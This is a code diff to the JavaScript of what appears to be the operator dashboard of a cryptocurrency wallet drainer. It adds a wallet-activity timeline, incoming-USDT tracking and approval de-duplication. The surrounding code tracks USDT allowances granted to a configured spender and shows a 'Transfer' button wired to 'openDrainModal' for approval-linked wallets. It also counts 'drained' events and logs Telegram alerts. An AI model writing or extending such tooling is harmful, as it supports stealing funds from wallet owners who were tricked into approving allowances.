@@ -2,12 +2,13 @@
     const API_BASE = (window.__ADMIN_PANEL_CONFIG__?.VITE_API_BASE_URL || '').trim().replace(/\/+$/, '');
     const SESSION_KEY = 'nexus-admin-session-token';
     const USER_KEY = 'nexus-admin-username';
-    const tabs = ['overview', 'transactions', 'wallets', 'approvals', 'network-logs'];
+    const tabs = ['overview', 'transactions', 'wallets', 'approvals', 'wallet-activity', 'network-logs'];
     const pageDetails = {
         overview: ['Overview', 'Live status from the secure monitoring backend.'],
         transactions: ['Transactions', 'On-chain transfer events and admin-submitted execution history.'],
         wallets: ['Wallets', 'Monitored wallet balances, allowances, and administrative actions.'],
         approvals: ['Approvals', 'Approval events detected for the configured token and spender.'],
+        'wallet-activity': ['Wallet Activity', 'Chronological approvals, revocations, and incoming USDT history for a verified wallet.'],
         'network-logs': ['Network Logs', 'Monitor cursor and recent events reported by the backend.']
     };
     const state = {
@@ -15,12 +16,15 @@
         wallets: [],
         approvals: [],
         transfers: [],
+        incomingTransfers: [],
         history: [],
         monitoring: null,
         search: '',
         currentTab: 'overview',
         loading: false,
-        activeWallet: null
+        activeWallet: null,
+        activityWallet: null,
+        walletActivity: []
     };
     let refreshTimer;
 
@@ -55,6 +59,12 @@
         return Number.isNaN(date.getTime())
             ? 'n/a'
             : date.toLocaleString(undefined, { dateStyle: 'medium', timeStyle: 'short' });
+    }
+
+    function formatUtcDate(value) {
+        if (!value) return 'Unavailable';
+        const date = new Date(value);
+        return Number.isNaN(date.getTime()) ? 'Unavailable' : date.toISOString().replace('T', ' ').replace(/\.\d{3}Z$/, ' UTC');
     }
 
     function numberValue(value) {
@@ -123,6 +133,21 @@
         const query = state.search.trim().toLowerCase();
         if (!query) return records;
         return records.filter((record) => values(record).some((value) => String(value ?? '').toLowerCase().includes(query)));
+    }
+
+    function uniqueApprovalRecords(records) {
+        const unique = new Map();
+        for (const record of records) {
+            const transactionHash = String(record.transactionHash || '').toLowerCase();
+            const tokenContract = String(record.tokenContract || '').toLowerCase();
+            const eventKey = record.chainId && tokenContract && transactionHash && Number.isInteger(Number(record.logIndex))
+                ? `${record.chainId}:${tokenContract}:${transactionHash}:${record.logIndex}`
+                : `id:${record.id}`;
+            const existing = unique.get(eventKey);
+            const canonicalPrefix = `approval-${record.chainId}-${tokenContract}-`;
+            if (!existing || String(record.id || '').startsWith(canonicalPrefix)) unique.set(eventKey, record);
+        }
+        return [...unique.values()];
     }
 
     async function api(path, options = {}) {
@@ -257,11 +282,12 @@
         if (state.loading || !sessionToken()) return;
         state.loading = true;
         try {
-            const [summary, wallets, approvals, transfers, history, monitoring] = await Promise.all([
+            const [summary, wallets, approvals, transfers, incomingTransfers, history, monitoring] = await Promise.all([
                 api('/api/admin/summary'),
                 api('/api/admin/wallets'),
                 api('/api/admin/approvals'),
                 api('/api/admin/transfers'),
+                api('/api/admin/incoming-transfers'),
                 api('/api/admin/history'),
                 api('/api/admin/monitoring')
             ]);
@@ -269,6 +295,7 @@
             state.wallets = Array.isArray(wallets) ? wallets : [];
             state.approvals = Array.isArray(approvals) ? approvals : [];
             state.transfers = Array.isArray(transfers) ? transfers : [];
+            state.incomingTransfers = Array.isArray(incomingTransfers) ? incomingTransfers : [];
             state.history = Array.isArray(history) ? history : [];
             state.monitoring = monitoring;
             renderDashboard();
@@ -295,7 +322,7 @@
         byId('stat-volume').textContent = `${formatToken(balanceTotal)} USDT`;
         byId('stat-volume-trend').textContent = `${state.wallets.length} wallet records synced`;
         byId('stat-lifetime-amount').textContent = `${formatToken(transferTotal)} USDT`;
-        byId('stat-drained-count').textContent = `${state.transfers.length} incoming transfer events`;
+        byId('stat-drained-count').textContent = `${state.incomingTransfers.length} incoming USDT events`;
         const lifetimeVolume = state.summary?.lifetimeTransferredVolume;
         const lifetimeAmount = formatUnits(lifetimeVolume?.rawAmount, lifetimeVolume?.decimals);
         byId('stat-transferred-volume').textContent = `${formatToken(lifetimeAmount, lifetimeVolume?.decimals)} ${lifetimeVolume?.tokenSymbol || 'USDT'}`;
@@ -320,6 +347,7 @@
         renderWallets();
         renderApprovals();
         renderTransactions();
+        renderWalletActivity();
         renderNetworkEvents();
     }
 
@@ -376,8 +404,8 @@
         }
         body.innerHTML = wallets.map((wallet) => {
             const actions = wallet.active
-                ? `${wallet.approvalLinked ? `<button data-action="transfer" data-address="${escapeHTML(wallet.address)}" class="px-3 py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-xs font-semibold">Transfer</button>` : ''}<button data-action="deactivate" data-address="${escapeHTML(wallet.address)}" class="ml-2 px-3 py-1.5 bg-red-950/50 hover:bg-red-900/50 border border-red-900/50 text-red-300 rounded-lg text-xs font-semibold">Deactivate</button>`
-                : '<span class="text-xs text-slate-500">No actions</span>';
+                ? `${wallet.approvalLinked ? `<button data-action="transfer" data-address="${escapeHTML(wallet.address)}" class="px-3 py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded-lg text-xs font-semibold">Transfer</button>` : ''}<button data-action="activity" data-address="${escapeHTML(wallet.address)}" class="ml-2 px-3 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-xs font-semibold">History</button><button data-action="deactivate" data-address="${escapeHTML(wallet.address)}" class="ml-2 px-3 py-1.5 bg-red-950/50 hover:bg-red-900/50 border border-red-900/50 text-red-300 rounded-lg text-xs font-semibold">Deactivate</button>`
+                : `<button data-action="activity" data-address="${escapeHTML(wallet.address)}" class="px-3 py-1.5 bg-slate-700 hover:bg-slate-600 text-white rounded-lg text-xs font-semibold">History</button>`;
             return `<tr class="hover:bg-[#1f2937]/40 transition-all">
                 <td class="wallet-address py-4 pl-2 font-mono text-xs text-white" title="${escapeHTML(wallet.address)}">${escapeHTML(wallet.address || 'n/a')}</td>
                 <td class="py-4 text-xs text-slate-300">${escapeHTML(wallet.network || 'Unknown')} <span class="text-slate-500">(${escapeHTML(wallet.chainId || 'n/a')})</span></td>
@@ -390,28 +418,121 @@
     }
 
     function renderApprovals() {
-        const approvals = visibleRecords(state.approvals, (record) => [
-            record.walletAddress, record.ownerAddress, record.spender, record.approvalAmount,
-            record.network, record.blockNumber, record.processingStatus, record.transactionHash
+        const approvalHistory = uniqueApprovalRecords(state.approvals);
+        const approvals = visibleRecords(approvalHistory, (record) => [
+            record.walletAddress, record.ownerAddress, record.spender, record.approvalAmount, record.rawApprovalAmount,
+            record.tokenContract, record.network, record.chainId, record.blockNumber,
+            record.approvalStatus, record.processingStatus, record.transactionHash
         ]);
         const body = byId('approvals-tbody');
         if (!approvals.length) {
-            body.innerHTML = emptyRow(7, state.search ? 'No approvals match this search.' : 'No approval events have been recorded.');
+            body.innerHTML = emptyRow(10, state.search ? 'No approvals match this search.' : 'No approval events have been recorded.');
             return;
         }
-        body.innerHTML = approvals.map((record) => `<tr class="hover:bg-[#1f2937]/40 transition-all">
+        const latestByWallet = new Map();
+        for (const record of approvalHistory) {
+            if (record.canonicalStatus === 'reorged') continue;
+            const wallet = String(record.walletAddress || record.ownerAddress || '').toLowerCase();
+            const current = latestByWallet.get(wallet);
+            if (!current || Number(record.blockNumber) > Number(current.blockNumber) ||
+                (Number(record.blockNumber) === Number(current.blockNumber) && Number(record.logIndex) > Number(current.logIndex))) {
+                latestByWallet.set(wallet, record);
+            }
+        }
+        body.innerHTML = approvals.map((record) => {
+            const wallet = String(record.walletAddress || record.ownerAddress || '').toLowerCase();
+            const isActive = latestByWallet.get(wallet)?.id === record.id &&
+                /^\d+$/.test(String(record.rawApprovalAmount ?? '')) &&
+                BigInt(record.rawApprovalAmount) > 0n;
+            const approvalStatus = record.canonicalStatus === 'reorged'
+                ? 'Reorged'
+                : isActive ? 'Active' : 'Revoked';
+            const approvalStatusClass = approvalStatus === 'Active'
+                ? 'text-emerald-400'
+                : approvalStatus === 'Reorged' ? 'text-amber-400' : 'text-slate-400';
+            return `<tr class="hover:bg-[#1f2937]/40 transition-all">
             <td class="wallet-address py-4 pl-2 font-mono text-xs text-white" title="${escapeHTML(record.walletAddress || record.ownerAddress)}">${escapeHTML(record.walletAddress || record.ownerAddress || 'n/a')}</td>
             <td class="py-4 font-mono text-xs text-slate-300" title="${escapeHTML(record.spender)}">${escapeHTML(formatAddress(record.spender))}</td>
+            <td class="py-4 font-mono text-xs text-slate-300" title="${escapeHTML(record.tokenContract)}">${escapeHTML(formatAddress(record.tokenContract))}</td>
             <td class="py-4 text-xs text-emerald-400">${escapeHTML(formatAllowance(record.approvalAmount, record.tokenDecimals, record.tokenSymbol || 'USDT'))}</td>
-            <td class="py-4 text-xs text-slate-300">${escapeHTML(record.network || 'Unknown')} / ${escapeHTML(record.blockNumber ?? 'n/a')}</td>
+            <td class="py-4 text-xs text-slate-300">${escapeHTML(record.network || 'Unknown')}</td>
+            <td class="py-4 text-xs text-slate-300">${escapeHTML(record.chainId || 'n/a')} / ${escapeHTML(record.blockNumber ?? 'n/a')}</td>
+            <td class="py-4 text-xs ${approvalStatusClass}">${approvalStatus}</td>
             <td class="py-4 text-xs text-slate-300">${escapeHTML(record.processingStatus || 'n/a')}</td>
             <td class="py-4 text-xs text-slate-300">${escapeHTML(formatDate(record.blockTimestamp || record.createdAt))}</td>
             <td class="py-4 font-mono text-xs text-slate-400" title="${escapeHTML(record.transactionHash)}">${escapeHTML(formatAddress(record.transactionHash))}</td>
-        </tr>`).join('');
+        </tr>`;
+        }).join('');
+    }
+
+    async function openWalletActivity(address) {
+        try {
+            const details = await api(`/api/admin/wallets/${encodeURIComponent(address)}`);
+            state.activityWallet = details.wallet;
+            state.walletActivity = Array.isArray(details.timeline) ? details.timeline : [];
+            switchTab('wallet-activity');
+            renderWalletActivity();
+        } catch (error) {
+            showNotification(error.message || 'Unable to load wallet activity.', 'error');
+        }
+    }
+
+    function renderWalletActivity() {
+        const walletLabel = byId('activity-wallet-address');
+        const body = byId('wallet-activity-tbody');
+        if (!walletLabel || !body) return;
+        const wallet = state.activityWallet;
+        walletLabel.textContent = wallet?.address || 'Select a wallet from the Wallets tab to review its history.';
+        const approvals = uniqueApprovalRecords(state.walletActivity.filter((record) => record.kind === 'approval'));
+        const activity = [...state.walletActivity.filter((record) => record.kind !== 'approval'), ...approvals]
+            .sort((first, second) => Number(first.blockNumber) - Number(second.blockNumber) || Number(first.logIndex) - Number(second.logIndex));
+        const records = visibleRecords(activity, (record) => [
+            record.kind, record.walletAddress, record.sender, record.spender, record.approvalAmount,
+            record.approvedAllowance, record.receivedAmount, record.transactionHash,
+            record.approvalStatus, record.confirmationStatus
+        ]);
+        if (!records.length) {
+            body.innerHTML = emptyRow(8, wallet ? 'No wallet activity has been recorded.' : 'Select a wallet from the Wallets tab.');
+            return;
+        }
+        body.innerHTML = records.map((record) => {
+            const approval = record.kind === 'approval';
+            const revokedEvent = approval && record.rawApprovalAmount === '0';
+            const title = approval
+                ? revokedEvent ? 'Approval revoked' : 'Approval granted'
+                : `Incoming from ${formatAddress(record.sender)}`;
+            const value = approval
+                ? formatAllowance(record.approvalAmount, record.tokenDecimals, record.tokenSymbol || 'USDT')
+                : `${formatToken(record.receivedAmount, record.tokenDecimals)} ${record.tokenSymbol || 'USDT'}`;
+            const spender = approval ? record.spender : record.spender;
+            const before = approval
+                ? '—'
+                : record.balanceBefore === undefined ? 'Unavailable' : `${formatToken(record.balanceBefore, record.tokenDecimals)} USDT`;
+            const after = approval
+                ? '—'
+                : record.balanceAfter === undefined ? 'Unavailable' : `${formatToken(record.balanceAfter, record.tokenDecimals)} USDT`;
+            const status = approval
+                ? `${record.approvalStatus || (revokedEvent ? 'revoked' : 'active')} · ${record.confirmationStatus || 'n/a'}`
+                : `${record.confirmationStatus || 'n/a'} · ${record.confirmations ?? 0} confirmations`;
+            const approvalDetails = approval
+                ? ''
+                : `<span class="block text-[10px] text-slate-400">Allowance: ${escapeHTML(formatAllowance(record.approvedAllowance, record.tokenDecimals, record.tokenSymbol || 'USDT'))}</span><span class="block text-[10px] text-slate-500">Approved: ${escapeHTML(formatUtcDate(record.approvalBlockTimestamp))}</span><a class="text-[10px] text-amber-400" target="_blank" rel="noopener noreferrer" href="https://bscscan.com/tx/${encodeURIComponent(record.approvalTransactionHash || '')}">Approval ${escapeHTML(formatAddress(record.approvalTransactionHash))}</a>`;
+            return `<tr class="hover:bg-[#1f2937]/40 transition-all">
+                <td class="py-4 pl-2"><span class="block text-xs font-semibold text-white">${escapeHTML(title)}</span><span class="text-[10px] text-slate-500">${escapeHTML(record.kind || '')}</span></td>
+                <td class="wallet-address py-4 font-mono text-xs text-slate-300" title="${escapeHTML(spender || record.sender || '')}"><span class="block">${escapeHTML(formatAddress(spender || record.sender))}</span>${approvalDetails}</td>
+                <td class="py-4 text-xs text-emerald-400">${escapeHTML(value)}</td>
+                <td class="py-4 text-xs text-slate-300">${escapeHTML(before)}</td>
+                <td class="py-4 text-xs text-slate-300" title="${escapeHTML(approval ? '' : record.balanceStatus || '')}">${escapeHTML(after)}</td>
+                <td class="py-4 text-xs text-slate-300">${escapeHTML(formatUtcDate(record.blockTimestamp))}<span class="block text-[10px] text-slate-500">Block ${escapeHTML(record.blockNumber ?? 'n/a')} · log ${escapeHTML(record.logIndex ?? 'n/a')}</span></td>
+                <td class="py-4 text-xs text-slate-300">${escapeHTML(status)}</td>
+                <td class="py-4 font-mono text-xs"><a class="text-amber-400 hover:text-amber-300" target="_blank" rel="noopener noreferrer" href="https://bscscan.com/tx/${encodeURIComponent(record.transactionHash || '')}">${escapeHTML(formatAddress(record.transactionHash))}</a></td>
+            </tr>`;
+        }).join('');
     }
 
     function renderTransactions() {
-        const transfers = state.transfers.map((record) => ({
+        const transfers = [
+            ...state.transfers.map((record) => ({
             kind: 'Incoming transfer',
             wallet: record.walletAddress,
             amount: `${formatToken(record.transferAmount, record.tokenDecimals)} ${record.tokenSymbol || 'USDT'}`,
@@ -419,7 +540,17 @@
             status: record.processingStatus,
             txHash: record.transactionHash,
             query: [record.walletAddress, record.transferAmount, record.transactionHash, record.network]
-        }));
+            })),
+            ...state.incomingTransfers.map((record) => ({
+                kind: `USDT received from ${formatAddress(record.sender)}`,
+                wallet: record.walletAddress,
+                amount: `${formatToken(record.receivedAmount, record.tokenDecimals)} ${record.tokenSymbol || 'USDT'}`,
+                date: record.blockTimestamp || record.createdAt,
+                status: record.confirmationStatus,
+                txHash: record.transactionHash,
+                query: [record.walletAddress, record.sender, record.receivedAmount, record.transactionHash, record.network]
+            }))
+        ];
         const history = state.history.map((record) => {
             const wallet = state.wallets.find((item) => item.address?.toLowerCase() === record.wallet?.toLowerCase());
             const decimals = wallet?.tokenDecimals ?? 6;
@@ -469,6 +600,15 @@
                 notification: record.telegramStatus,
                 date: record.blockTimestamp || record.createdAt,
                 query: [record.walletAddress, record.transferAmount, record.transactionHash, record.network]
+            })),
+            ...state.incomingTransfers.map((record) => ({
+                kind: 'Incoming USDT',
+                wallet: record.walletAddress,
+                amount: `${formatToken(record.receivedAmount, record.tokenDecimals)} ${record.tokenSymbol || 'USDT'}`,
+                block: record.blockNumber,
+                notification: record.telegramStatus,
+                date: record.blockTimestamp || record.createdAt,
+                query: [record.walletAddress, record.sender, record.receivedAmount, record.transactionHash, record.network]
             }))
         ].sort((first, second) => new Date(second.date || 0).getTime() - new Date(first.date || 0).getTime());
         const filtered = visibleRecords(events, (record) => record.query);
@@ -634,6 +774,7 @@
             const address = button.dataset.address;
             if (button.dataset.action === 'transfer') openDrainModal(address);
             if (button.dataset.action === 'deactivate') void deactivateWallet(address);
+            if (button.dataset.action === 'activity') void openWalletActivity(address);
         });
         const username = sessionStorage.getItem(USER_KEY) || localStorage.getItem(USER_KEY);
         if (sessionToken()) {
